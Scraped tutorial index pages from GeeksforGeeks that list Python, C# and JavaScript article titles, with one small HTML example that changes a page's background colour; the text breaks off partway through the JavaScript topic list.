Basics, Input/Output, Data Types, Variables, Operators, Control Flow, Functions, Object Oriented Concepts, Exception Handling, Python Collections, Django Framework, Data Analysis, Numpy, Pandas, Machine Learning with Python, Python GUI, Modules in Python, Working with Database, Misc, Applications and Projects, Multiple Choice Questions Basics Python language introduction Python 3 basics Python The new generation language Important difference between python 2.x and python 3.x with example Keywords in Python | Set 1, Set 2 Namespaces and Scope in Python Statement, Indentation and Comment in Python Structuring Python Programs How to check if a string is a valid keyword in Python? How to assign values to variables in Python and other languages How to print without newline in Python? Decision making Basic calculator program using Python Python Language advantages and applications Input/Output Taking input in Python Taking input from console in Python Taking multiple inputs from user in Python Python Input Methods for Competitive Programming Vulnerability in input() function – Python 2.x Python | Output using print() function How to print without newline in Python? Python | end parameter in print() Python | sep parameter in print() Python | Output Formatting Data Types Introduction to DataTypes Strings List Tuples Sets Dictionary Arrays Variables Variables, expression condition and function Maximum possible value of an integer in python? Global and local variables in python Packing and unpacking arguments in python Type conversion in python Byte objects vs string in python Print single and multiple variable Swap variable Private variables __name__ (A Special variable) in Python Operators Basic operator in python Logical and bitwise not operator on boolean Ternary operator Division operator in python Operator Overloading in Python Any & all in python Inplace and standard operators in python Operator function in python | Set – 1 Inplace operator | Set -1 Logic Gates in Python Python | a += b is not always a = a + b Difference between == and is operator in Python Python Membership and Identity Operators | in, not in, is, is not Control Flow Loops Loops and Control Statements (continue, break and pass) in Python Looping technique in python range vs xrange on python Programs for printing pyramid technique in python Chaining comparison in python else with for switch function Using iteration in python effectively Python Itertools Python __iter__() and __next__() | Converting an object into an iterator Python | Difference between iterable and iterator Generators in python Generators expression in python Functions Functions in Python class method vs static method in Python Write an empty function in Python – pass statement Yield instead of Return Return Multiple Values Partial Functions in Python First Class functions in Python Precision Handling *args and **kwargs Python closures Function Decorators Decorators in Python Decorators with parameters in Python Memoization using decorators in Python Help function in Python Python | __import__() function Python | range() does not return an iterator Coroutine in Python Python bit functions on int (bit_length, to_bytes and from_bytes) Object Oriented Concepts Python3 Intermediate Level Topics Class, Object and Members Data Hiding and Object Printing Inheritance, examples of object, issubclass and super Polymorphism in Python Class and static variable in python Class method and static method in python Changing class members Constructors in Python Destructors in Python First class function Metaprogramming with metaclasses Class and instance attribute Reflection Garbage collection Exception Handling Exception handling User defined Exception Built-in Exception clean up action Nzec error try and except in Python Python Collections Counters OrderedDict Defaultdict ChainMap NamedTuple DeQue Heap Collections.UserDict Collections.UserList Collections.UserString Django Framework Django Tutorial Django Basics Django Introduction and Installation Django Forms Views In Django Django Models Django Templates ToDo webapp using Django Django News App Weather app using Django Data Analysis Data visualization using Bokeh Exploratory Data Analysis in Python Data visualization with different Charts in Python Data analysis and Visualization with Python Data Analysis & Visualization with Python | Set 2 Math operations for Data analysis Getting started with Jupyter Notebook | Python Numpy Python Numpy Numpy | ndarray Numpy | Array Creation Numpy | Data Type Objects Data type Object (dtype) in NumPy Numpy | Indexing Numpy | Basic Slicing and Advanced Indexing Numpy | Iterating Over Array Numpy | Binary Operations Numpy | Linear Algebra Numpy | Sorting, Searching and Counting Pandas Pandas Tutorial Python | Pandas DataFrame Creating a Pandas DataFrame Dealing with Rows and Columns in Pandas DataFrame Indexing and Selecting Data with Pandas Boolean Indexing in Pandas Conversion Functions in Pandas DataFrame Iterating over rows and columns in Pandas DataFrame Working with Missing Data in Pandas Python | Pandas Series Data analysis using Pandas Read csv using pandas.read_csv() Machine Learning with Python Machine Learning Tutorial Linear Regression Understanding Logistic Regression K means Clustering Python | Image Classification using keras creating a simple machine learning model Python | Implementation of Movie Recommender System ML | Boston Housing Kaggle Challenge with Linear Regression Cancer cell classification using Scikit-learn Saving a machine learning Model Applying Convolutional Neural Network on mnist dataset Python | NLP analysis of Restaurant reviews Learning Model Building in Scikit-learn Implementing Artificial Neural Network training process A single neuron neural network in Python Python | How and where to apply Feature Scaling? Identifying handwritten digits using Logistic Regression in PyTorch Python GUI Tkinter Tutorial Kivy Tutorial Python GUI – tkinter Simple GUI calculator using Tkinter Simple registration form using Tkinter Create a stopwatch using python Designing GUI applications Using PyQt Color game using Tkinter in Python Make Notepad using Tkinter Message Encode-Decode using Tkinter Real time currency convertor using Tkinter Modules in Python Introduction of Modules OS module Calendar Module Python Urllib Module pprint Timit function Import module Working With Database MongoDB and Python SQL using Python | Set 1 SQL using Python and SQLite | Set 2 SQL using Python | Set 3 (Handling large data) Inserting variables to database table using Python MYSQLdb Connection in Python Database management in PostgreSQL Oracle Database Connection in Python Misc 10 Essential Python Tips And Tricks For Programmers Amazing hacks of Python Input method for comptetive programming Optimization Tips for Python Code Why import star in Python is a bad idea Why is python best suited for Competitive Coding? Python trics for Competitive Coding Applications and Projects Python | Program to crawl a web page and get most frequent words Facebook login using python FB Chatting through python C/C++ code formating tool Find Live running status and PNR of any train using Railway API Fetching top news using News API Fetching text from Wikipedia’s Infobox in Python Get emotions of images using Microsoft emotion API in Python Website blocker Send SMS updates to mobile phone using python Python Desktop News Notifier in 20 lines Morse Code Translator In Python Performing Google Search using Python code Reading and generating qr code Birthday reminder application in python Program to display Astrological sign or Zodiac sign for given date of birth Track bird migration News notifier whatsapp using python Python | Automating Happy Birthday post on Facebook using Selenium Design a Keylogger in Python Python | Implementation of Movie Recommender System Recommended Python Tutorials Python Tutorial Machine Learning Tutorial Django Tutorial Pandas Tutorial OpenCV Python Tutorial Selenium Python Tutorial Python Tkinter Tutorial My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTop 10 Programming Languages to Learn in 2020 - Demand, Jobs, Career GrowthTypes of Environments in AIDesign Twitter - A System Design Interview Question Most Visited Articles Top 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in Python5 Common System Design Concepts for Interview PreparationMaximal independent set from a given Graph using Backtracking room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

C# Programming Language - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Introductionexpand_moreC# Programming LanguageIntroduction to .NET FrameworkC# | .NET Framework (Basic Architecture and Component Stack)Hello World in C#Common Language Runtime (CLR) in C#Fundamentalsexpand_moreC# | IdentifiersC# | Data TypesC# | VariablesC# | LiteralsC# | OperatorsC# | KeywordsControl Statementsexpand_moreC# Decision Making (if, if-else, if-else-if ladder, nested if, switch, nested switch)Switch Statement in C#Loops in C#C# | Jump Statements (Break, Continue, Goto, Return and Throw)OOP Conceptsexpand_moreC# | Class and ObjectC# | ConstructorsC# | InheritanceC# | EncapsulationC# | AbstractionMethodsexpand_moreC# | MethodsC# | Method OverloadingC# | Method ParametersC# | Method OverridingAnonymous Method in C#Arraysexpand_moreC# | ArraysC# | Jagged ArraysC# | Array ClassHow to sort an Array in C# | Array.Sort() Method Set – 1How to find the rank of an array in C#ArrayListexpand_moreArrayList in C#C# | ArrayList ClassC# | Array vs ArrayListStringexpand_moreC# | StringC# | Verbatim String Literal – @C# | String classStringBuilder in C#C# | String vs StringBuilderTupleexpand_moreC# | TupleC# | Tuple ClassValueTuple in C#ValueTuple Struct in C#Indexersexpand_moreC# | IndexersC# | Multidimensional IndexersC# | Overloading of IndexersPropertiesexpand_moreC# | PropertiesC# | Restrictions on PropertiesCollections & Genericsexpand_moreCollections in C#C# | Collection ClassC# | Generics – IntroductionList Implementation in C#C# SortedList with ExamplesHashSet in C# with ExamplesSortedSet in C# with ExamplesC# Dictionary with examplesSortedDictionary Implementation in C#C# Hashtable with ExamplesC# Stack with ExamplesC# Queue with ExamplesLinked List Implementation in C# C# Programming Language C# is a general-purpose, modern and object-oriented programming language pronounced as “C Sharp”. It was developed by Microsoft led by Anders Hejlsberg and his team within the .NET initiative and was approved by the European Computer Manufacturers Association (ECMA) and International Standards Organization (ISO). C# is among the languages for Common Language Infrastructure. C# is a lot similar to Java syntactically and is easy for users who have knowledge of C, C++ or Java. Recent Articles on C# ! Overview, Fundamentals, Important Keywords, Control Statements, OOP Concepts, Methods, Delegates, Constructors, Arrays, ArrayList, String, Tuple, ValueTuple, Indexers, Inheritance, Interfaces, Multithreading, Exception Handling, Collections and Generics, Collections Namespace, Generic Namespace, System Namespace, Specialized Namespace, What’s New in C# 8.0, Windows Forms Overview Introduction to .NET Framework .NET Framework (Basic Architecture and Component Stack) Managed code and Unmanaged code in .NET Managed vs Unmanaged Code CIL or MSIL .NET Framework Class Library (FCL) Introduction to C# Setting up the Environment in C# How to Install and Setup Visual Studio for C#? Evolution of C# Hello World in C# How to Execute C# Program on cmd (command-line)? Main Method Getting Familiar With Visual Studio Common Language Runtime(CLR) Architecture of Common Language Runtime (CLR) JIT(Just-In-Time) Compiler Garbage Collection Windows Form Applications C vs C# C++ vs C# Java vs C# Python vs C# Interesting Facts about C# Type System Unification in C# .NET Fundamentals Identifiers Data Types Variables Types of Variables Implicitly Typed Local Variables – var Dynamic Type in C# var vs dynamic Binary Literals and Digit Separators Scope of Variables Access Modifiers Constants or Literals Operators Command Line Arguments Boxing and Unboxing Boxing vs UnBoxing Params in C# Comments in C# Type Casting or Type Conversion Enumeration in C# Properties in C# Nullable Types Structures Important Keywords Keywords as Keyword is Keyword Is vs As operator keyword static keyword typeof Keyword Difference between readonly and const keyword ref keyword Control Statements Decision-Making Statements Switch Statement Loops Foreach Loop Jump Statements(Break, Continue, Goto, Return and Throw) OOP Concepts Class and Object Nested Classes Difference between Class and Structure Early and Late Binding Overloading of Constructors Inheritance in C# Encapsulation in C# Abstraction in C# this keyword Static Class Partial Classes Shallow Copy and Deep Copy Different ways to create an Object Object and Collection Initializer Accessing structure’s elements using Pointers Methods Methods Method Overloading Method Returning an Object Method Parameters Runtime(Dynamic) Polymorphsim Method Overriding Method Hiding Method Overriding vs Method Hiding Optional Parameters Different ways to make Method Parameter Optional Out Parameters with examples Difference between Ref and Out keywords Anonymous Method Partial Methods Extension Method Local Function Delegates Delegates Predicate Delegate Action Delegate Func Delegate Constructors Constructors in C# Default Constructor Copy Constructor Private Constructor Constructor Overloading Static Constructors vs Non-Static Constructors Invoking an overloaded constructor using this keyword Destructors Arrays Arrays Jagged Arrays Arrays of Strings Using foreach loop in arrays Array Class Sorting an Array Length of an Array Array.BinarySearch() Method Check if two array objects are equal or not Number of elements in a specified dimension of an Array LongLength property of an Array Rank of an Array Passing Arrays as Arguments Implicitly Typed Arrays Object and Dynamic Arrays Array IndexOutofRange Exception Different ways to sort an array in descending order ArrayList What is ArrayList? How to create the ArrayList? ArrayList Class Array vs ArrayList Adding the elements to the end of the ArrayList Removing all the elements from the ArrayList Removing a range of elements from the ArrayList ArrayList to Array Conversion Copying the entire ArrayList to a 1-D Array Copying the entire ArrayList to 1-D Array starting at the specified index Check if two ArrayList objects are equal String String Verbatim String Literal – @ String Class String Class Properties How to use strings in switch statement StringBuilder in C# String vs StringBuilder Length of the StringBuilder Remove all characters from StringBuilder Check if two StringBuilder objects are Equal Capacity of a StringBuilder Tuple What is Tuple in C#? Tuple Class Tuple<T1> Class Tuple<T1,T2> Class Tuple<T1,T2,T3> Class Tuple<T1,T2,T3,T4> Class Tuple<T1,T2,T3,T4,T5> Class Tuple<T1,T2,T3,T4,T5,T6> Class Tuple<T1,T2,T3,T4,T5,T6,T7> Class Tuple<T1,T2,T3,T4,T5,T6,T7,TRest> Class ValueTuple What is ValueTuple in C#? ValueTuple Struct ValueTuple <T1> Struct ValueTuple <T1,T2> Struct ValueTuple <T1,T2,T3> Struct ValueTuple <T1,T2,T3,T4> Struct ValueTuple <T1,T2,T3,T4,T5> Struct ValueTuple <T1,T2,T3,T4,T5,T6> Struct ValueTuple <T1,T2,T3,T4,T5,T6,T7> Struct ValueTuple <T1,T2,T3,T4,T5,T6,T7,TRest> Struct Indexers & Properties Indexers Multidimensional Indexers Overloading of Indexers Properties Restrictions on Properties Inheritance Inheritance in C# Multilevel Inheritance Multiple inheritance using interfaces Inheritance in Constructors Inheritance in Interfaces Abstract Classes Using sealed class to Prevent Inheritance Object Class Interfaces Interface in C# How to use Interface References How to Implement Multiple Interfaces Having Same Method Name Difference between Abstract Class and Interface Delegates vs Interfaces Explicit Interface Implementation Multithreading Introduction to Multithreading Types of Threads How to create Threads Main Thread Lifecycle and States of a Thread Thread Class Scheduling a thread for Execution Check whether a Thread is Alive or not Joining Threads Terminating a Thread Check whether a thread is a background thread or not Naming a thread and fetching name of current thread Thread Priority in Multithreading Exception Handling Exceptions System Level Exception vs Application Level Exception How to use Multiple Catch Clause Nesting of try and catch blocks Using finally Collections & Generics List SortedList with Examples HashSet SortedSet Dictionary with Examples SortedDictionary Hashtable with Examples Stack with Examples Queue with Examples LinkedList Hashtable vs Dictionary SortedList vs SortedDictionary Collections Namespace C# | Stack Class C# | Queue Class C# | Array Class C# | ArrayList Class C# | Hashtable Class C# | BitArray Class C# | SortedList Class Generic Namespace C# | HashSet<T> Class C# | LinkedList<T> Class C# | List<T> Class C# | SortedSet<T> Class Dictionary Class SortedDictionary Class System Namespace BitConverter Class Console Class Convert Class Decimal Struct Byte Struct Char Struct Int16 Struct Int32 Struct Int64 Struct UInt16 Struct UInt32 Struct UInt64 Struct Specialized Namespace C# | ListDictionary Class C# | StringCollection Class C# | OrderedDictionary Class C# | HybridDictionary Class C# | StringDictionary Class What’s New in C# 8.0 Static Local Function Range and Indices Range Structure Index Struct Windows Forms What is Windows Forms(WF) in C#? Button Control Label Control RadioButton Control CheckBox Control TextBox Control ComboBox Control ToolTip Class RichTextBox Class MaskedBox Class NumericUpDown Class DateTimePicker Class ListBox Class GroupBox Class FlowLayoutPanel Class My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonMajor Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceFibonacci Series Program in JavaScriptHow to send an email from JavaScript ? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

JavaScript Tutorials - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ JS Basicsexpand_moreJavaScript TutorialsIntroduction to JavaScriptJS Full FormWhere to put JavaScript in an HTML Document ?JavaScript | StatementsJavaScript | SyntaxJavaScript | OutputJavaScript | CommentsVariables and Datatypes in JavaScriptGlobal and Local variables in JavaScriptJavaScript | LetJavaScript | ConstJavaScript | NumbersFunctions in JavaScriptObjects in JavascriptJavaScript | Eventsif-else Statement in JavaScriptSwitch Case in JavaScriptJavaScript | Break and ContinueJavaScript | Type ConversionJavaScript Regular ExpressionsUnderstanding variable scopes in JavaScriptJavaScript | HoistingJavaScript | Strict Modethis in JavaScriptJavaScript | Reserved WordsJavaScript JSONJS Operatorsexpand_moreJavaScript OperatorsJavaScript | Arithmetic OperatorsJavaScript | Assignment operatorsJavaScript Comparison operatorsJavaScript Bitwise OperatorsJavaScript delete OperatorJavaScript Comma operatorJavaScript Grouping operatorJavascript Short circuiting operatorsJavaScript Nullish Coalescing OperatorJavaScript Ternary OperatorJavaScript Instanceof OperatorJavaScript | Spread OperatorWhat is JavaScript >>> Operator and How to use it ?What does +_ operator mean in JavaScript?How to get negative result using modulo operator in JavaScript ?JS Loopsexpand_moreLoops in JavaScriptJavaScript | For LoopJavaScript | While LoopJavaScript for-in LoopExplain the differences between for(..in) and for(..of) statement in JavaScript.How to add a delay in a JavaScript loop?Ways of iterating over a array in JavaScript.How to ignore loop in else condition using JavaScript ?JS Debuggingexpand_moredebugging in JavaScriptJavaScript | Style Guide and Coding ConventionsJavaScript | Common MistakesJavaScript | PerformanceJavaScript | Errors – Throw and Try to CatchDebouncing in JavaScriptHow to include a JavaScript file in another JavaScript file ?JS Methodsexpand_moreArrays in JavaScriptJavaScript Basic Array MethodsJavaScript Array sort() MethodJavaScript | Array Iteration MethodsHow to select a random element from array in JavaScript ?Check if an array is empty or not in JavaScriptHow to check if a variable is an array in JavaScript?JavaScript | StringsJavaScript | String MethodsJavaScript | Replace multiple strings with multiple other stringsCompare the Case Insensitive strings in JavaScriptHow to create multi-line strings in JavaScript?Optimum way to compare strings in JavaScriptHow to sort strings in JavaScript?What are the builtin strings in JavaScript ?JS Math Objectexpand_moreJavaScript | Math ObjectJavaScript Math random() MethodJavaScript Math abs( ) MethodJavaScript | Math.ceil( ) functionJavaScript Math floor() MethodJavaScript Math log( ) MethodJavaScript Math max() MethodJavaScript Math min( ) MethodJavaScript Math pow( ) MethodJavaScript | Math.round( ) functionJavaScript Math sqrt( ) MethodJavaScript | Math Object Complete ReferenceJS Date Objectexpand_moreJavaScript | DateJavaScript | Date FormatsJavaScript Date constructor PropertyJavaScript | Get Date MethodsJavaScript | Set Date MethodsJavaScript Date getUTCDate() MethodJavaScript Date now() MethodJavaScript Date parse() MethodJavaScript | Date Object Complete ReferenceJS Boolean and DataViewexpand_moreJavaScript BooleanJavaScript Boolean constructor PropertyJavaScript Boolean valueOf() MethodJavaScript Boolean prototype ConstructorHow to generate a random boolean using JavaScript ?How to toggle a boolean using JavaScript ?JavaScript DataView.getFloat32() MethodJavaScript dataView.getUint32() MethodJavaScript dataView.setFloat32() MethodJavaScript dataView.setInt32() MethodJavaScript dataView.setUint32() MethodJavaScript | Boolean and dataView Complete ReferenceJS Formexpand_moreHow to Create a Form Dynamically with the JavaScript?Form validation using HTML and JavaScriptJavaScript | Auto-filling one field same as otherJavaScript | Dialogue BoxesJS Advanceexpand_moreArrow functions in JavaScriptJavaScript | Rest parameterJavaScript | Importing and Exporting ModulesJavaScript | Classes JavaScript Tutorials JavaScript is a lightweight, cross-platform and interpreted scripting language. It is well-known for the development of web pages, many non-browser environments also use it. JavaScript can be used for Client-side developments as well as Server-side developments. Example: <!DOCTYPE html> <html> <head> <title></title> </head> <body bgcolor="white"> <p>Paragraph 1</p> <script type="text/javascript"> document.bgColor ="lightblue"; </script> </body> <html> Output: Features of JavaScript: According to a recent survey conducted by Stack Overflow, JavaScript is the most popular language on earth. With advances in browser technology and JavaScript having moved into the server with Node.js and other frameworks, JavaScript is capable of so much more. Here are a few things that we can do with JavaScript: JavaScript was created in the first place for DOM manipulation. Earlier websites were mostly static, after JS was created dynamic Web sites were made. Functions in JS are objects. They may have properties and methods just like another object. They can be passed as arguments in other functions. Can handle date and time. Performs Form Validation although the forms are created using HTML. No compiler needed. ‘Recent Articles’ on Javascript Topics : Basics Objects Functions Array TypedArray Strings Mathematics Date WeakSet WeakMap Boolean Dataview Number Atomics Form Implementation of Data Structures ES2015 p5.js Underscore.js Misc Quick Links Operators: JavaScript | Operators JavaScript | typeof operator JavaScript | Rest Operator JavaScript | Rest Operator JavaScript | Bitwise Operators JavaScript | ‘===’ vs ‘==’Comparision Operator JavaScript | Spread Operator Arrow operator in ES6 of JavaScript More>> Array: JavaScript | Arrays Javascript | Basic Array Methods Javascript | Array.prototype.map() Javascript | Array.findIndex() Javascript | array.entries() Javascript | Array every() Javascript | Array copyWithin() Javascript | array.values() Javascript | array.toLocaleString() Javascript | Array.of() Javascript | Array some() Javascript | Array join() Javascript | Array fill() Javascript | Array find() Javascript | Array concat() Javascript | Array filter() JavaScript | Array.from() JavaScript | Array.find() JavaScript arrayBuffer.slice() Javascript | Array shift() JavaScript | array.reduceRight() JavaScript | arrayBuffer.byteLength JavaScript | ArrayBuffer.isView() Javascript | Array unshift() Javascript | Array.isArray() Javascript | Array toString() Javascript | Array reverse() Javascript | Array sort() JavaScript | Sort() method Javascript | Array pop() Javascript | Array push() Javascript | Array forEach() Javascript | Array lastIndexOf() Javascript | Array slice() Javascript | Array indexOf() JavaScript | ArrayBuffer Object Javascript | length of string and array objects Ways of iterating over a array in JavaScript JavaScript | arrayBuffer.byteLength property JavaScript | Array.splice() Method JavaScript | Array.splice() Method Extract unique objects by attribute from array of objects. Must use JavaScript Array Functions – Part 1 Must use JavaScript Array Functions – Part 2 Must use JavaScript Array Functions – Part 3 More>> TypedArray: JavaScript | typedArray.buffer() and typedArray.byteLength() with Example JavaScript | typedArray.BYTES_PER_ELEMENT with Examples JavaScript | typedArray.from() with Examples JavaScript | typedArray.name with Examples JavaScript | typedArray.of() with Examples JavaScript | typedArray.reverse() with Examples JavaScript | typedArray.indexOf() with Examples JavaScript | typedArray.some() with Example JavaScript | typedArray.every() with Examples JavaScript | typedArray.copyWithin() with Examples JavaScript | typedArray.entries() with Examples JavaScript | typedArray.length() with Examples JavaScript | typedArray.map() with Examples JavaScript | typedArray.reduce() with Examples JavaScript | typedArray.subarray() with Examples JavaScript | typedArray.slice() with Example JavaScript | typedArray.keys() with Example JavaScript | typedArray.sort() with Examples JavaScript | typedArray.@@species with Example JavaScript | typedArray.@@iterator with Example JavaScript | typedArray.byteOffset property JavaScript | typedArray.forEach() with Examples JavaScript | typedArray.lastIndexOf() with Examples JavaScript | typedArray.reduceRight() with Examples JavaScript | typedArray.toString() with Examples JavaScript | typedArray.values() with Examples JavaScript | typedArray.fill() JavaScript | typedArray.filter() with Example JavaScript | typedArray.find() with Example JavaScript | typedArray.findIndex() with Example JavaScript | typedArray.set() with Example JavaScript | typedArray.includes() with Examples JavaScript | typedArray.join() with Example More>> Strings: Javascript | String substr() Javascript | String trim() Javascript | String.prototype.charCodeAt() Javascript | String.fromCharCode() Javascript | String startsWith() Javascript | String lastIndexOf() Javascript | String toUpperCase() Javascript | String toLowerCase() Javascript | String split() JavaScript | string.normalize() JavaScript | string.replace() JavaScript | string.search() JavaScript | string.toString() JavaScript | string.slice() JavaScript | string.substring() JavaScript | string.length JavaScript | String.fromCodePoint() JavaScript | string.localeCompare() JavaScript | string.repeat() JavaScript | string.valueOf() Javascript | String indexOf() Javascript | String endsWith() Javascript | String concat() Javascript | String charAt() JavaScript | String includes() More>> Date: JavaScript | Date.prototype property JavaScript | date.toLocaleDateString() JavaScript | Date.now() JavaScript | Date JavaScript | date.toLocaleString() JavaScript | Date.UTC( ) JavaScript | date.setUTCMonth() JavaScript | date.toJSON() function JavaScript | date.valueOf() function JavaScript | date.toISOString() function JavaScript | date.toTimeString() function JavaScript | date.toString() function JavaScript | date.toDateString() function JavaScript | date.setMilliseconds() function JavaScript | date.getMilliseconds() Function JavaScript | date.setMonth() function JavaScript | date.getMonth() method JavaScript | date.toUTCString() function JavaScript | date.toLocaleTimeString() JavaScript | date.setUTCDate() function JavaScript | date.getUTCDate() Function JavaScript | date.getUTCFullYear() Function JavaScript | date.getUTCDay() Function JavaScript | date.setUTCFullYear() function JavaScript | date.setUTCHours() function JavaScript | clearTimeout() & clearInterval() Method JavaScript | date.setUTCMilliseconds() function JavaScript | date.getUTCMilliseconds() Function JavaScript | date.setUTCSeconds() function JavaScript | date.getUTCSeconds() Function JavaScript | date.setUTCMinutes() function JavaScript | date.getUTCMinutes() Function JavaScript | date.getUTCMonth() Function JavaScript | date.setMinutes() Function JavaScript | date.getMinutes() Method JavaScript | date.setSeconds() Function JavaScript | date.getSeconds() method JavaScript | date.setHours() Function JavaScript | date.getHours() Function JavaScript | date.setFullYear() Function JavaScript | date.getFullYear() Function JavaScript | date.setDate() function JavaScript | date.getDate() Function JavaScript | date.getDay() method JavaScript | Date.parse() More>> Dataview: JavaScript | dataView.getInt8() JavaScript | dataView.getInt16() JavaScript | dataView.getInt32() JavaScript | dataView.getUint8() JavaScript | dataView.getUint16() JavaScript | dataView.getUint32() JavaScript | dataView.getFloat32() JavaScript | dataView.getFloat64() JavaScript | dataView.setInt8() JavaScript | dataView.setUint8() JavaScript | dataView.setInt16() JavaScript | dataView.setInt32() JavaScript | dataView.setUint16() JavaScript | dataView.setUint32() JavaScript | dataView.setFloat32() JavaScript | dataView.setFloat64() More>> Number: Javascript | toPrecision() Javascript | toFixed() Javascript | toString() Javascript | Number() Javascript | toExponential() Javascript | Number valueOf() Javascript | Number.isInteger( ) Javascript | Number.isFinite() Javascript | Number.isSafeInteger() Javascript | Number.isNaN() JavaScript | Number Guessing Game JavaScript | Number.MAX_VALUE & Number.MIN_VALUE with Examples Javascript | Number() Function More>> Javascript | Atomics: Javascript | Atomics.add() Javascript | Atomics.xor() Javascript | Atomics.and() Javascript | Atomics.isLockFree( ) Javascript | Atomics.compareExchange( ) Javascript | Atomics.or() Javascript | Atomics.store( ) Javascript | Atomics.load( ) Javascript | Atomics.sub( ) Javascript | Atomics.exchange( ) More>> Form: Form validation using HTML and JavaScript How to create a responsive Modal Sign-Up form for a Website? Javascript | Auto-filling one field same as other Javascript | Dialogue Boxes More>> Implementation of Data Structures: Implementation of LinkedList in Javascript Implementation of Queue in Javascript Implementation of Stack in JavaScript Implementation of Priority Queue in Javascript Implementation of Binary Search Tree in Javascript Implementation of Graph in JavaScript Merge Sort for Linked Lists in JavaScript More>> ES2015: ES2015: Latest version of JavaScript New features of JavaScript Arrays with ES2015 Closure Map Sets JavaScript ES2015: Block Scoping More>> Boolean: JavaScript | Boolean JavaScript | Boolean.prototype with Examples JavaScript | boolean.toString() JavaScript | boolean.valueOf() More>> WeakSet: JavaScript | WeakSet JavaScript | 